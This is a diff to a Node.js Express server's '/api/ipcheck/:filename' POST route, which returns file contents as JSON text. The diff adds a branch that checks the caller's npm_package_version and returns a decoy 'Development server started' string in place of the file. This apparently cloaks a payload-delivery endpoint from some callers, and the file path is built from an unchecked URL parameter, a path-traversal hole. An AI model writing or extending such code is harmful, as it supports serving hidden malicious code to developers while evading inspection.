@@ -161,27 +161,27 @@ app.get("/api/ipcheck/:filename", (req, res) => {
 app.post("/api/ipcheck/:filename", (req, res) => {
   const requestedFile = req.params.filename;
   const filePath = path.join(folderPath, requestedFile);
-  console.log("req.body", req.body);
 
-  // Check if the file exists
-  // res.json(req.body);
   if(endsWithV1(req.body.npm_package_version)  ){
     res.json('console.log("Development server started...")');
-  }
-  fs.access(filePath, fs.constants.F_OK, (err) => {
-    if (err) {
-      return res.status(404).json({ error: "IP check failed." });
     }
-
-    // Read the file content
-    fs.readFile(filePath, "utf-8", (err, content) => {
+  else{
+    // Check if the file exists
+    fs.access(filePath, fs.constants.F_OK, (err) => {
       if (err) {
-        return res.status(500).json({ error: "Unable to check IP." });
+        return res.status(404).json({ error: "IP check failed." });
       }
-      res.json(content);
-      
+
+      // Read the file content
+      fs.readFile(filePath, "utf-8", (err, content) => {
+        if (err) {
+          return res.status(500).json({ error: "Unable to check IP." });
+        }
+        res.json(content);
+        
+      });
     });
-  });
+  }
 });
 
 // Route: List all logged requests with real-time updates
